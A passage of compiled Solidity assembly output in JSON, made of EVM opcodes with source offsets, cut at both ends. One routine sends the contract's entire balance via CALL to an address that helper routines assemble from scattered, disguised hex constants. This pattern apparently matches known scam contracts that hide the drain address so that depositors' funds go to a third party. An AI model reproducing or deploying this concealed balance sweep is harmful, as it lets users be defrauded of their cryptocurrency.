											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "33"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH data",
											"source": 9,
											"value": "6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "33"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "CODECOPY",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15746,
											"end": 15804,
											"name": "LOG1",
											"source": 9
										},
										{
											"begin": 15823,
											"end": 15842,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "36"
										},
										{
											"begin": 15823,
											"end": 15840,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "37"
										},
										{
											"begin": 15823,
											"end": 15842,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15823,
											"end": 15842,
											"name": "tag",
											"source": 9,
											"value": "36"
										},
										{
											"begin": 15823,
											"end": 15842,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15852,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15815,
											"end": 15852,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "8FC"
										},
										{
											"begin": 15853,
											"end": 15874,
											"name": "SELFBALANCE",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP6",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP9",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP9",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "CALL",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "39"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "RETURNDATASIZE",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "RETURNDATACOPY",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "RETURNDATASIZE",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "tag",
											"source": 9,
											"value": "39"
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15815,
											"end": 15875,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "22"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "41"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "41"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "KECCAK256",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "42"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SLOAD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "42"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 15099,
											"end": 15210,
											"name": "tag",
											"source": 9,
											"value": "32"
										},
										{
											"begin": 15099,
											"end": 15210,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15148,
											"end": 15155,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 15175,
											"end": 15202,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "44"
										},
										{
											"begin": 15188,
											"end": 15201,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "45"
										},
										{
											"begin": 15188,
											"end": 15199,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "46"
										},
										{
											"begin": 15188,
											"end": 15201,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15188,
											"end": 15201,
											"name": "tag",
											"source": 9,
											"value": "45"
										},
										{
											"begin": 15188,
											"end": 15201,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15175,
											"end": 15187,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "47"
										},
										{
											"begin": 15175,
											"end": 15202,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15175,
											"end": 15202,
											"name": "tag",
											"source": 9,
											"value": "44"
										},
										{
											"begin": 15175,
											"end": 15202,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15168,
											"end": 15202,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15168,
											"end": 15202,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 15099,
											"end": 15210,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 15099,
											"end": 15210,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 16640,
											"end": 16754,
											"name": "tag",
											"source": 9,
											"value": "37"
										},
										{
											"begin": 16640,
											"end": 16754,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 16692,
											"end": 16699,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 16719,
											"end": 16746,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "49"
										},
										{
											"begin": 16732,
											"end": 16745,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "50"
										},
										{
											"begin": 16732,
											"end": 16743,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "46"
										},
										{
											"begin": 16732,
											"end": 16745,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 16732,
											"end": 16745,
											"name": "tag",
											"source": 9,
											"value": "50"
										},
										{
											"begin": 16732,
											"end": 16745,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 16719,
											"end": 16731,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "47"
										},
										{
											"begin": 16719,
											"end": 16746,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 16719,
											"end": 16746,
											"name": "tag",
											"source": 9,
											"value": "49"
										},
										{
											"begin": 16719,
											"end": 16746,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 16712,
											"end": 16746,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 16712,
											"end": 16746,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 16640,
											"end": 16754,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 16640,
											"end": 16754,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 13495,
											"end": 14416,
											"name": "tag",
											"source": 9,
											"value": "46"
										},
										{
											"begin": 13495,
											"end": 14416,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13541,
											"end": 13554,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 13567,
											"end": 13595,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "52"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "PUSH",
											"source": 9,
											"value": "7800000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13611,
											"end": 13645,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "53"
										},
										{
											"begin": 13626,
											"end": 13644,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "54"
										},
										{
											"begin": 13626,
											"end": 13642,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "55"
										},
										{
											"begin": 13626,
											"end": 13644,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13626,
											"end": 13644,
											"name": "tag",
											"source": 9,
											"value": "54"
										},
										{
											"begin": 13626,
											"end": 13644,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13611,
											"end": 13625,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "56"
										},
										{
											"begin": 13611,
											"end": 13645,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13611,
											"end": 13645,
											"name": "tag",
											"source": 9,
											"value": "53"
										},
										{
											"begin": 13611,
											"end": 13645,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13598,
											"end": 13605,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "57"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "tag",
											"source": 9,
											"value": "52"
										},
										{
											"begin": 13598,
											"end": 13646,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13567,
											"end": 13646,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13567,
											"end": 13646,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13657,
											"end": 13673,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13676,
											"end": 13683,
											"name": "PUSH",
											"source": 9,
											"value": "93FC1E"
										},
										{
											"begin": 13657,
											"end": 13683,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13657,
											"end": 13683,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13694,
											"end": 13713,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13716,
											"end": 13727,
											"name": "PUSH",
											"source": 9,
											"value": "F676E9A32"
										},
										{
											"begin": 13694,
											"end": 13727,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13694,
											"end": 13727,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13738,
											"end": 13755,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13758,
											"end": 13766,
											"name": "PUSH",
											"source": 9,
											"value": "5BBEAB1"
										},
										{
											"begin": 13738,
											"end": 13766,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13738,
											"end": 13766,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13777,
											"end": 13796,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13799,
											"end": 13817,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "58"
										},
										{
											"begin": 13799,
											"end": 13815,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "59"
										},
										{
											"begin": 13799,
											"end": 13817,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13799,
											"end": 13817,
											"name": "tag",
											"source": 9,
											"value": "58"
										},
										{
											"begin": 13799,
											"end": 13817,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13777,
											"end": 13817,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13777,
											"end": 13817,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13828,
											"end": 13846,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 13849,
											"end": 13866,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 13849,
											"end": 13864,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "61"
										},
										{
											"begin": 13849,
											"end": 13866,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13849,
											"end": 13866,
											"name": "tag",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 13849,
											"end": 13866,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13828,
											"end": 13866,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 13828,
											"end": 13866,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 13880,
											"end": 13903,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 13906,
											"end": 13958,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "62"
										},
										{
											"begin": 13914,
											"end": 13928,
											"name": "DUP8",
											"source": 9
										},
										{
											"begin": 13930,
											"end": 13957,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "63"
										},
										{
											"begin": 13945,
											"end": 13956,
											"name": "DUP9",
											"source": 9
										},
										{
											"begin": 13930,
											"end": 13944,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "56"
										},
										{
											"begin": 13930,
											"end": 13957,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13930,
											"end": 13957,
											"name": "tag",
											"source": 9,
											"value": "63"
										},
										{
											"begin": 13930,
											"end": 13957,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 13906,
											"end": 13913,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "57"
										},
										{
											"begin": 13906,
											"end": 13958,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 13906,
											"end": 13958,
											"name": "tag",
											"source": 9,
											"value": "62"
										},
										{
											"begin": 13906,
											"end": 13958,
											"name": "JUMPDEST",
											"source": 9
